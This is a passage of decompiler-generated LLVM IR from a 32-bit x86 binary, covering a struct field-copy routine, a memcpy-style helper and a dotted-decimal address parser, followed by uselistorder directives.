  %v2_8054929 = add i32 %v1_8054929, 20
  %v3_8054929 = inttoptr i32 %v2_8054929 to i32*
  store i32 %v4_8054925, i32* %v3_8054929, align 4
  %v0_805492c = load i32, i32* %esi.global-to-local, align 4
  %v1_805492c = add i32 %v0_805492c, 12
  %v2_805492c = inttoptr i32 %v1_805492c to i16*
  %v3_805492c = load i16, i16* %v2_805492c, align 2
  %v4_805492c = zext i16 %v3_805492c to i32
  store i32 %v4_805492c, i32* %eax.global-to-local, align 4
  %v1_8054930 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054930 = add i32 %v1_8054930, 24
  %v3_8054930 = inttoptr i32 %v2_8054930 to i32*
  store i32 %v4_805492c, i32* %v3_8054930, align 4
  %v0_8054933 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054933 = add i32 %v0_8054933, 14
  %v2_8054933 = inttoptr i32 %v1_8054933 to i16*
  %v3_8054933 = load i16, i16* %v2_8054933, align 2
  %v4_8054933 = zext i16 %v3_8054933 to i32
  store i32 %v4_8054933, i32* %eax.global-to-local, align 4
  %v1_8054937 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054937 = add i32 %v1_8054937, 28
  %v3_8054937 = inttoptr i32 %v2_8054937 to i32*
  store i32 %v4_8054933, i32* %v3_8054937, align 4
  %v0_805493a = load i32, i32* %esi.global-to-local, align 4
  %v1_805493a = add i32 %v0_805493a, 16
  %v2_805493a = inttoptr i32 %v1_805493a to i16*
  %v3_805493a = load i16, i16* %v2_805493a, align 2
  %v4_805493a = zext i16 %v3_805493a to i32
  store i32 %v4_805493a, i32* %eax.global-to-local, align 4
  %v0_805493e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805493e = add i32 %v0_805493e, 36
  %v2_805493e = inttoptr i32 %v1_805493e to i32*
  store i32 0, i32* %v2_805493e, align 4
  %v0_8054945 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054945 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054945 = add i32 %v1_8054945, 32
  %v3_8054945 = inttoptr i32 %v2_8054945 to i32*
  store i32 %v0_8054945, i32* %v3_8054945, align 4
  %v0_8054948 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054948 = add i32 %v0_8054948, 20
  %v2_8054948 = inttoptr i32 %v1_8054948 to i32*
  %v3_8054948 = load i32, i32* %v2_8054948, align 4
  store i32 %v3_8054948, i32* %eax.global-to-local, align 4
  %v1_805494b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805494b = add i32 %v1_805494b, 44
  %v3_805494b = inttoptr i32 %v2_805494b to i32*
  store i32 %v3_8054948, i32* %v3_805494b, align 4
  %v0_805494e = load i32, i32* %esi.global-to-local, align 4
  %v1_805494e = add i32 %v0_805494e, 24
  %v2_805494e = inttoptr i32 %v1_805494e to i32*
  %v3_805494e = load i32, i32* %v2_805494e, align 4
  store i32 %v3_805494e, i32* %eax.global-to-local, align 4
  %v1_8054951 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054951 = add i32 %v1_8054951, 48
  %v3_8054951 = inttoptr i32 %v2_8054951 to i32*
  store i32 %v3_805494e, i32* %v3_8054951, align 4
  %v0_8054954 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054954 = add i32 %v0_8054954, 28
  %v2_8054954 = inttoptr i32 %v1_8054954 to i32*
  %v3_8054954 = load i32, i32* %v2_8054954, align 4
  store i32 %v3_8054954, i32* %eax.global-to-local, align 4
  %v1_8054957 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054957 = add i32 %v1_8054957, 52
  %v3_8054957 = inttoptr i32 %v2_8054957 to i32*
  store i32 %v3_8054954, i32* %v3_8054957, align 4
  %v0_805495a = load i32, i32* %esi.global-to-local, align 4
  %v1_805495a = add i32 %v0_805495a, 32
  %v2_805495a = inttoptr i32 %v1_805495a to i32*
  %v3_805495a = load i32, i32* %v2_805495a, align 4
  store i32 %v3_805495a, i32* %eax.global-to-local, align 4
  %v1_805495d = load i32, i32* %ebx.global-to-local, align 4
  %v2_805495d = add i32 %v1_805495d, 56
  %v3_805495d = inttoptr i32 %v2_805495d to i32*
  store i32 %v3_805495a, i32* %v3_805495d, align 4
  %v0_8054960 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054960 = add i32 %v0_8054960, 40
  %v2_8054960 = inttoptr i32 %v1_8054960 to i32*
  %v3_8054960 = load i32, i32* %v2_8054960, align 4
  store i32 %v3_8054960, i32* %eax.global-to-local, align 4
  %v1_8054963 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054963 = add i32 %v1_8054963, 64
  %v3_8054963 = inttoptr i32 %v2_8054963 to i32*
  store i32 %v3_8054960, i32* %v3_8054963, align 4
  %v0_8054966 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054966 = add i32 %v0_8054966, 48
  %v2_8054966 = inttoptr i32 %v1_8054966 to i32*
  %v3_8054966 = load i32, i32* %v2_8054966, align 4
  store i32 %v3_8054966, i32* %eax.global-to-local, align 4
  %v1_8054969 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054969 = add i32 %v1_8054969, 72
  %v3_8054969 = inttoptr i32 %v2_8054969 to i32*
  store i32 %v3_8054966, i32* %v3_8054969, align 4
  %v2_805496f = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805496f, i32* @ebx, align 4
  ret i32 %v3_8054966

; uselistorder directives
  uselistorder i32 72, { 4, 3, 5, 0, 6, 7, 8, 1, 9, 10, 11, 12, 2 }
  uselistorder i32 64, { 11, 10, 6, 5, 0, 1, 7, 2, 12, 13, 4, 8, 3, 9 }
  uselistorder i32 40, { 10, 5, 11, 6, 0, 7, 8, 9, 1, 3, 12, 2, 13, 14, 15, 16, 4 }
  uselistorder i32 56, { 9, 8, 0, 1, 2, 3, 4, 5, 10, 11, 12, 13, 14, 6, 15, 16, 17, 7 }
  uselistorder i32 52, { 6, 5, 8, 9, 2, 3, 0, 7, 4, 1 }
  uselistorder i32 48, { 14, 15, 12, 7, 11, 1, 6, 8, 2, 3, 9, 0, 10, 13, 4, 16, 17, 18, 19, 20, 5 }
  uselistorder i32 32, { 58, 59, 63, 37, 48, 64, 65, 60, 34, 52, 53, 66, 1, 0, 2, 3, 43, 4, 5, 6, 7, 8, 38, 67, 39, 44, 45, 49, 46, 47, 35, 10, 9, 12, 11, 13, 14, 41, 40, 50, 51, 54, 55, 15, 56, 17, 16, 42, 57, 61, 36, 62, 68, 18, 19, 20, 21, 69, 22, 23, 70, 71, 25, 24, 27, 26, 28, 29, 72, 30, 31, 73, 74, 75, 32, 33, 76 }
  uselistorder i32 36, { 5, 4, 0, 2, 6, 7, 1, 8, 9, 10, 11, 3 }
  uselistorder i32 14, { 5, 1, 3, 0, 2, 10, 11, 6, 7, 8, 9, 4 }
  uselistorder i32 24, { 46, 47, 18, 44, 45, 54, 48, 49, 50, 7, 8, 0, 1, 14, 35, 31, 9, 12, 19, 13, 20, 21, 10, 37, 32, 22, 11, 23, 36, 24, 25, 26, 27, 28, 29, 30, 33, 34, 38, 39, 40, 43, 42, 41, 15, 2, 51, 52, 53, 5, 16, 4, 3, 55, 17, 6 }
  uselistorder i32 20, { 28, 29, 10, 18, 26, 27, 41, 30, 31, 32, 33, 0, 1, 17, 12, 15, 16, 13, 19, 14, 20, 21, 22, 23, 24, 25, 2, 3, 34, 35, 36, 4, 5, 37, 38, 39, 42, 40, 9, 7, 8, 6, 43, 44, 45, 11 }
  uselistorder i32 16, { 80, 81, 82, 83, 84, 85, 86, 87, 20, 52, 3, 88, 33, 116, 4, 67, 68, 69, 0, 5, 117, 118, 7, 6, 119, 1, 8, 89, 90, 21, 34, 51, 27, 35, 28, 36, 11, 12, 44, 53, 54, 10, 60, 39, 42, 43, 40, 56, 41, 45, 55, 46, 13, 38, 37, 57, 58, 59, 61, 62, 63, 47, 64, 29, 65, 22, 70, 71, 72, 73, 74, 75, 76, 77, 78, 30, 14, 79, 23, 24, 31, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 49, 106, 25, 26, 107, 108, 109, 110, 111, 9, 32, 66, 112, 113, 114, 120, 115, 121, 125, 16, 126, 127, 128, 129, 130, 131, 132, 122, 123, 124, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 2, 143, 144, 145, 146, 147, 148, 149, 150, 19, 151, 17, 18, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 15, 174, 50, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 48 }
  uselistorder i32 8, { 115, 116, 117, 118, 119, 120, 121, 122, 123, 54, 129, 55, 130, 56, 94, 11, 132, 133, 134, 135, 136, 137, 138, 4, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 5, 103, 104, 105, 106, 107, 108, 109, 110, 149, 150, 151, 152, 153, 154, 63, 6, 64, 7, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 62, 172, 173, 8, 174, 175, 176, 177, 9, 178, 124, 125, 126, 127, 131, 58, 65, 59, 66, 60, 67, 179, 180, 181, 68, 98, 97, 12, 95, 99, 100, 101, 13, 102, 111, 112, 113, 114, 14, 15, 16, 17, 18, 10, 69, 0, 19, 20, 128, 70, 71, 21, 72, 73, 22, 23, 74, 24, 1, 2, 182, 51, 183, 29, 30, 28, 35, 184, 27, 33, 34, 75, 61, 76, 77, 31, 78, 32, 79, 3, 25, 52, 185, 36, 80, 37, 81, 38, 39, 40, 41, 82, 42, 43, 44, 83, 45, 84, 186, 85, 46, 86, 47, 87, 187, 88, 48, 89, 49, 90, 91, 92, 50, 26, 188, 53, 189, 93, 96, 57 }
  uselistorder i32 (i8*, i32, i32)* @function_805277a, { 7, 4, 5, 6, 0, 1, 2, 3, 8 }
  uselistorder i32 88, { 0, 2, 1, 3 }
}

define i32 @function_8054972(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8054972:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8054973 = load i32, i32* @esi, align 4
  store i32 %v0_8054973, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_8054974 = sdiv i32 %sext, 16777216
  store i32 %v4_8054974, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_805497e = ptrtoint i16* %arg1 to i32
  store i32 %v4_805497e, i32* %edi.global-to-local, align 4
  %v2_8054982 = udiv i32 %v4_8054974, 4
  %v3_8054985 = inttoptr i32 %arg2 to i8*
  %v4_8054985 = bitcast i16* %arg1 to i8*
  %v5_8054985 = call i8* @_memcpy(i8* %v4_8054985, i8* %v3_8054985, i32 %v2_8054982)
  %v0_8054987 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054987 = and i32 %v0_8054987, 2
  %v3_8054987 = icmp eq i32 %v2_8054987, 0
  br i1 %v3_8054987, label %dec_label_pc_805498d, label %dec_label_pc_805498b

dec_label_pc_805498b:                             ; preds = %dec_label_pc_8054972
  %v0_805498b = load i32, i32* %esi.global-to-local, align 4
  %v1_805498b = inttoptr i32 %v0_805498b to i16*
  %v2_805498b = load i16, i16* %v1_805498b, align 2
  %v3_805498b = load i32, i32* %edi.global-to-local, align 4
  %v4_805498b = inttoptr i32 %v3_805498b to i16*
  store i16 %v2_805498b, i16* %v4_805498b, align 2
  %v5_805498b = load i32, i32* %edi.global-to-local, align 4
  %v6_805498b = load i32, i32* %esi.global-to-local, align 4
  %v7_805498b = load i1, i1* @df, align 1
  %v8_805498b = select i1 %v7_805498b, i32 -2, i32 2
  %v9_805498b = add i32 %v8_805498b, %v5_805498b
  %v10_805498b = add i32 %v8_805498b, %v6_805498b
  store i32 %v9_805498b, i32* %edi.global-to-local, align 4
  store i32 %v10_805498b, i32* %esi.global-to-local, align 4
  %v0_805498d.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805498d

dec_label_pc_805498d:                             ; preds = %dec_label_pc_8054972, %dec_label_pc_805498b
  %v0_805498d = phi i32 [ %v0_8054987, %dec_label_pc_8054972 ], [ %v0_805498d.pre, %dec_label_pc_805498b ]
  %v2_805498d = urem i32 %v0_805498d, 2
  %v3_805498d = icmp eq i32 %v2_805498d, 0
  br i1 %v3_805498d, label %dec_label_pc_8054992, label %dec_label_pc_8054991

dec_label_pc_8054991:                             ; preds = %dec_label_pc_805498d
  %v0_8054991 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054991 = inttoptr i32 %v0_8054991 to i8*
  %v2_8054991 = load i8, i8* %v1_8054991, align 1
  %v3_8054991 = load i32, i32* %edi.global-to-local, align 4
  %v4_8054991 = inttoptr i32 %v3_8054991 to i8*
  store i8 %v2_8054991, i8* %v4_8054991, align 1
  %v5_8054991 = load i32, i32* %edi.global-to-local, align 4
  %v6_8054991 = load i32, i32* %esi.global-to-local, align 4
  %v7_8054991 = load i1, i1* @df, align 1
  %v8_8054991 = select i1 %v7_8054991, i32 -1, i32 1
  %v9_8054991 = add i32 %v8_8054991, %v5_8054991
  %v10_8054991 = add i32 %v8_8054991, %v6_8054991
  store i32 %v9_8054991, i32* %edi.global-to-local, align 4
  store i32 %v10_8054991, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054992

dec_label_pc_8054992:                             ; preds = %dec_label_pc_805498d, %dec_label_pc_8054991
  store i32 %v4_805497e, i32* %eax.global-to-local, align 4
  %v2_8054996 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8054996, i32* @esi, align 4
  ret i32 %v4_805497e

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 4, 1, 3, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 -2, { 19, 18, 20, 17, 21, 0, 1, 4, 7, 8, 5, 3, 2, 6, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i1* @df, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 4, { 2, 180, 181, 182, 183, 184, 185, 235, 236, 238, 239, 240, 241, 242, 237, 56, 94, 243, 245, 246, 248, 251, 252, 253, 254, 255, 256, 3, 257, 258, 259, 260, 261, 262, 263, 264, 249, 250, 159, 59, 160, 161, 162, 163, 164, 165, 166, 4, 168, 167, 265, 5, 266, 58, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 9, 287, 288, 290, 289, 6, 247, 244, 98, 63, 186, 187, 188, 189, 190, 60, 64, 291, 292, 65, 105, 106, 66, 107, 108, 109, 132, 133, 134, 137, 138, 139, 140, 141, 142, 129, 130, 110, 111, 143, 144, 145, 119, 120, 121, 99, 100, 101, 116, 117, 118, 122, 123, 124, 125, 126, 127, 146, 147, 102, 103, 104, 112, 113, 114, 115, 13, 128, 131, 95, 148, 156, 157, 158, 149, 135, 136, 61, 155, 14, 150, 62, 151, 152, 153, 154, 169, 170, 171, 96, 172, 173, 15, 174, 175, 176, 16, 17, 18, 19, 177, 67, 68, 178, 179, 69, 57, 191, 0, 192, 193, 194, 195, 196, 197, 20, 21, 198, 70, 199, 71, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 22, 72, 73, 212, 213, 214, 215, 216, 217, 218, 23, 219, 220, 221, 222, 24, 74, 223, 224, 225, 226, 25, 293, 294, 227, 228, 229, 230, 231, 232, 233, 234, 8, 295, 296, 297, 52, 30, 31, 29, 36, 28, 34, 35, 298, 299, 300, 10, 75, 76, 77, 32, 78, 33, 79, 1, 301, 26, 302, 53, 11, 303, 37, 80, 38, 81, 39, 304, 40, 41, 42, 82, 43, 44, 45, 83, 46, 84, 85, 47, 86, 48, 87, 305, 88, 49, 89, 50, 90, 306, 91, 92, 307, 51, 308, 309, 310, 311, 313, 312, 314, 315, 316, 317, 318, 319, 320, 321, 322, 27, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 54, 12, 7, 350, 55, 93, 351, 97 }
  uselistorder i32 16777216, { 1, 0, 3, 2, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* @esi, { 121, 122, 38, 39, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 2, 78, 79, 123, 124, 13, 125, 126, 127, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 128, 129, 130, 144, 148, 3, 149, 150, 151, 152, 153, 154, 155, 145, 146, 147, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 156, 157, 158, 159, 160, 161, 162, 0, 163, 164, 165, 166, 4, 167, 10, 168, 169, 170, 171, 172, 173, 80, 81, 5, 82, 83, 84, 85, 86, 87, 88, 89, 142, 143, 174, 175, 14, 17, 18, 19, 29, 30, 25, 31, 23, 15, 22, 24, 32, 26, 16, 20, 21, 27, 28, 33, 34, 35, 36, 37, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 111, 110, 1, 112, 113, 114, 115, 11, 116, 176, 177, 178, 117, 118, 119, 9, 179, 180, 120, 181, 182, 6, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 7, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 12, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 8, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 283, 280, 281, 282, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304 }
  uselistorder label %dec_label_pc_8054992, { 1, 0 }
  uselistorder label %dec_label_pc_805498d, { 1, 0 }
}

define i32 @function_8054999(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8054999:
  %v1_80549a4 = icmp eq i8* %arg1, null
  br i1 %v1_80549a4, label %dec_label_pc_8054a25, label %dec_label_pc_80549a8

dec_label_pc_80549a8:                             ; preds = %dec_label_pc_8054999
  %v4_80549a0 = ptrtoint i8* %arg1 to i32
  %v0_80549b6.pre = load i32, i32* bitcast (i32** @global_var_805686c.229 to i32*), align 4
  br label %dec_label_pc_80549b3

dec_label_pc_80549b3:                             ; preds = %dec_label_pc_80549a8, %dec_label_pc_80549fc
  %v0_80549fc = phi i32 [ 0, %dec_label_pc_80549a8 ], [ %v2_8054a02, %dec_label_pc_80549fc ]
  %v2_80549ff = phi i32 [ 1, %dec_label_pc_80549a8 ], [ %v3_80549ff, %dec_label_pc_80549fc ]
  %v0_80549b3 = phi i32 [ %v4_80549a0, %dec_label_pc_80549a8 ], [ %v0_80549b34, %dec_label_pc_80549fc ]
  %v1_80549b3 = inttoptr i32 %v0_80549b3 to i8*
  %v2_80549b3 = load i8, i8* %v1_80549b3, align 1
  %v3_80549b3 = sext i8 %v2_80549b3 to i32
  %v2_80549bc = mul nsw i32 %v3_80549b3, 2
  %v3_80549bc = add i32 %v2_80549bc, %v0_80549b6.pre
  %v4_80549bc = inttoptr i32 %v3_80549bc to i8*
  %v5_80549bc = load i8, i8* %v4_80549bc, align 1
  %v6_80549bc = and i8 %v5_80549bc, 8
  %v7_80549bc = icmp eq i8 %v6_80549bc, 0
  br i1 %v7_80549bc, label %dec_label_pc_8054a25, label %dec_label_pc_80549c3

dec_label_pc_80549c3:                             ; preds = %dec_label_pc_80549b3
  %v4_80549d7.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80549d7

dec_label_pc_80549c7:                             ; preds = %dec_label_pc_80549d7
  %v3_80549c7 = mul i32 %v1_80549c7, 10
  %v2_80549ca = add i32 %v3_80549c7, -48
  %v3_80549ca = add i32 %v2_80549ca, %v2_80549d9
  %v1_80549ce = add i32 %v3_80549ca, -255
  %v6_80549ce = sub i32 254, %v3_80549ca
  %v7_80549ce = and i32 %v6_80549ce, %v3_80549ca
  %v8_80549ce = icmp slt i32 %v7_80549ce, 0
  %v9_80549ce = icmp eq i32 %v1_80549ce, 0
  %v10_80549ce = icmp slt i32 %v1_80549ce, 0
  %v3_80549d4 = icmp eq i1 %v10_80549ce, %v8_80549ce
  %v4_80549d4 = icmp eq i1 %v9_80549ce, false
  %v5_80549d4 = and i1 %v4_80549d4, %v3_80549d4
  br i1 %v5_80549d4, label %dec_label_pc_8054a25, label %dec_label_pc_80549d6

dec_label_pc_80549d6:                             ; preds = %dec_label_pc_80549c7
  %v1_80549d6 = add i32 %v0_80549d6, 1
  br label %dec_label_pc_80549d7

dec_label_pc_80549d7:                             ; preds = %dec_label_pc_80549c3, %dec_label_pc_80549d6
  %v1_80549c7 = phi i32 [ 0, %dec_label_pc_80549c3 ], [ %v3_80549ca, %dec_label_pc_80549d6 ]
  %v4_80549d7 = phi i32 [ %v4_80549d7.pre, %dec_label_pc_80549c3 ], [ %v6_80549d7, %dec_label_pc_80549d6 ]
  %v0_80549d6 = phi i32 [ %v0_80549b3, %dec_label_pc_80549c3 ], [ %v1_80549d6, %dec_label_pc_80549d6 ]
  %v1_80549d7 = inttoptr i32 %v0_80549d6 to i8*
  %v2_80549d7 = load i8, i8* %v1_80549d7, align 1
  %v3_80549d7 = zext i8 %v2_80549d7 to i32
  %v5_80549d7 = and i32 %v4_80549d7, -256
  %v6_80549d7 = or i32 %v3_80549d7, %v5_80549d7
  store i32 %v6_80549d7, i32* @edx, align 4
  %v2_80549d9 = sext i8 %v2_80549d7 to i32
  %v2_80549dc = mul nsw i32 %v2_80549d9, 2
  %v3_80549dc = add i32 %v2_80549dc, %v0_80549b6.pre
  %v4_80549dc = inttoptr i32 %v3_80549dc to i16*
  %v5_80549dc = load i16, i16* %v4_80549dc, align 2
  %v2_80549e1 = and i16 %v5_80549dc, 8
  %v3_80549e1 = icmp eq i16 %v2_80549e1, 0
  %v1_80549e3 = icmp eq i1 %v3_80549e1, false
  br i1 %v1_80549e3, label %dec_label_pc_80549c7, label %dec_label_pc_80549e5

dec_label_pc_80549e5:                             ; preds = %dec_label_pc_80549d7
  %v8_80549e5 = sub nsw i32 2, %v2_80549ff
  %v9_80549e5 = and i32 %v8_80549e5, %v2_80549ff
  %v10_80549e5 = icmp slt i32 %v9_80549e5, 0
  %v11_80549e5 = icmp eq i32 %v2_80549ff, 3
  %v12_80549e5 = icmp slt i32 %v2_80549ff, 3
  %v3_80549e9 = icmp eq i1 %v12_80549e5, %v10_80549e5
  %v4_80549e9 = icmp eq i1 %v11_80549e5, false
  %v5_80549e9 = and i1 %v4_80549e9, %v3_80549e9
  br i1 %v5_80549e9, label %dec_label_pc_80549f3, label %dec_label_pc_80549eb

dec_label_pc_80549eb:                             ; preds = %dec_label_pc_80549e5
  %v10_80549eb = icmp eq i8 %v2_80549d7, 46
  %v1_80549ee = icmp eq i1 %v10_80549eb, false
  br i1 %v1_80549ee, label %dec_label_pc_8054a25, label %dec_label_pc_80549f0

dec_label_pc_80549f0:                             ; preds = %dec_label_pc_80549eb
  %v1_80549f0 = add i32 %v0_80549d6, 1
  br label %dec_label_pc_80549fc

dec_label_pc_80549f3:                             ; preds = %dec_label_pc_80549e5
  %v1_80549f3 = add i32 %v0_80549d6, 1
  %v4_80549f4 = icmp eq i8 %v2_80549d7, 0
  br i1 %v4_80549f4, label %dec_label_pc_80549fc, label %dec_label_pc_80549f8

dec_label_pc_80549f8:                             ; preds = %dec_label_pc_80549f3
  %v2_80549f8 = and i16 %v5_80549dc, 32
  %v3_80549f8 = icmp eq i16 %v2_80549f8, 0
  br i1 %v3_80549f8, label %dec_label_pc_8054a25, label %dec_label_pc_80549fc

dec_label_pc_80549fc:                             ; preds = %dec_label_pc_80549f8, %dec_label_pc_80549f3, %dec_label_pc_80549f0
  %v0_80549b34 = phi i32 [ %v1_80549f3, %dec_label_pc_80549f8 ], [ %v1_80549f3, %dec_label_pc_80549f3 ], [ %v1_80549f0, %dec_label_pc_80549f0 ]
  %v2_80549fc = mul i32 %v0_80549fc, 256
  %v3_80549ff = add nuw nsw i32 %v2_80549ff, 1
  %v2_8054a02 = or i32 %v1_80549c7, %v2_80549fc
  %v7_8054a08 = icmp sgt i32 %v2_80549ff, 3
  br i1 %v7_8054a08, label %dec_label_pc_8054a0a, label %dec_label_pc_80549b3

dec_label_pc_8054a0a:                             ; preds = %dec_label_pc_80549fc
  %v4_8054a0f = icmp eq i32 %arg2, 0
  br i1 %v4_8054a0f, label %dec_label_pc_8054a27, label %dec_label_pc_8054a16

dec_label_pc_8054a16:                             ; preds = %dec_label_pc_8054a0a
  %v1_8054a1a = call i32 @llvm.bswap.i32(i32 %v2_8054a02)
  %v2_8054a1c = inttoptr i32 %arg2 to i32*
  store i32 %v1_8054a1a, i32* %v2_8054a1c, align 4
  br label %dec_label_pc_8054a27

dec_label_pc_8054a25:                             ; preds = %dec_label_pc_80549f8, %dec_label_pc_80549eb, %dec_label_pc_80549b3, %dec_label_pc_80549c7, %dec_label_pc_8054999
  br label %dec_label_pc_8054a27

dec_label_pc_8054a27:                             ; preds = %dec_label_pc_8054a0a, %dec_label_pc_8054a16, %dec_label_pc_8054a25
  %v0_8054a2c = phi i32 [ 1, %dec_label_pc_8054a0a ], [ 1, %dec_label_pc_8054a16 ], [ 0, %dec_label_pc_8054a25 ]
  ret i32 %v0_8054a2c

; uselistorder directives
  uselistorder i32 %v2_80549d9, { 1, 0 }
  uselistorder i32 %v6_80549d7, { 1, 0 }
  uselistorder i8 %v2_80549d7, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80549d6, { 0, 1, 3, 2 }
  uselistorder i32 %v1_80549ce, { 1, 0 }
  uselistorder i32 %v3_80549ca, { 1, 0, 3, 2 }
  uselistorder i32 %v2_80549ff, { 1, 4, 2, 0, 3, 5 }
  uselistorder i32 256, { 1, 23, 27, 24, 2, 3, 4, 5, 0, 6, 7, 28, 21, 8, 9, 11, 10, 22, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 26 }
  uselistorder i32 3, { 1, 2, 0, 29, 15, 32, 6, 7, 11, 3, 8, 12, 4, 20, 21, 22, 23, 24, 25, 26, 16, 9, 27, 28, 13, 14, 10, 30, 31, 5, 33, 18, 19, 34, 17 }
  uselistorder i16 0, { 0, 1, 7, 8, 4, 5, 6, 2, 3 }
  uselistorder i32 -256, { 4, 38, 39, 40, 41, 42, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 8, 9, 23, 10, 13, 15, 24, 17, 18, 19, 5, 6, 7, 11, 12, 14, 16, 20, 21, 22, 27, 25, 26, 28, 29, 30, 31, 32, 33, 34, 35, 2, 3, 36, 37, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 68, 69, 70, 71, 0, 72, 73, 74, 1, 75, 76, 77, 78, 79 }
  uselistorder i32 -48, { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32 10, { 1, 18, 19, 13, 20, 2, 25, 8, 0, 3, 9, 4, 10, 5, 11, 16, 15, 14, 12, 17, 21, 22, 23, 6, 24, 7, 26, 27, 28 }
  uselistorder i32* @edx, { 23, 3, 68, 69, 70, 32, 18, 0, 20, 21, 55, 56, 57, 58, 19, 71, 72, 73, 74, 77, 76, 78, 86, 87, 4, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 5, 101, 102, 84, 85, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 6, 49, 50, 51, 103, 148, 149, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 7, 141, 142, 143, 144, 145, 146, 147, 83, 22, 80, 59, 60, 150, 82, 61, 75, 79, 62, 81, 151, 152, 1, 153, 154, 155, 8, 156, 157, 158, 159, 160, 161, 162, 9, 163, 15, 24, 25, 26, 27, 13, 14, 11, 10, 28, 16, 29, 12, 31, 30, 52, 53, 54, 17, 63, 64, 65, 66, 67, 2, 164, 165, 166, 167, 168, 169, 170 }
  uselistorder i8 0, { 46, 47, 85, 86, 68, 33, 43, 69, 6, 87, 88, 89, 90, 58, 91, 92, 93, 94, 95, 96, 34, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 2, 112, 113, 114, 115, 48, 52, 53, 49, 54, 50, 51, 55, 0, 56, 57, 60, 62, 59, 7, 61, 8, 63, 64, 65, 66, 67, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 70, 25, 26, 71, 27, 28, 29, 30, 31, 32, 72, 73, 74, 75, 76, 5, 77, 78, 9, 79, 80, 81, 82, 83, 84, 35, 36, 116, 117, 3, 119, 120, 118, 121, 122, 123, 124, 4, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 44, 145, 1, 146, 37, 45, 38, 39, 40, 41, 42 }
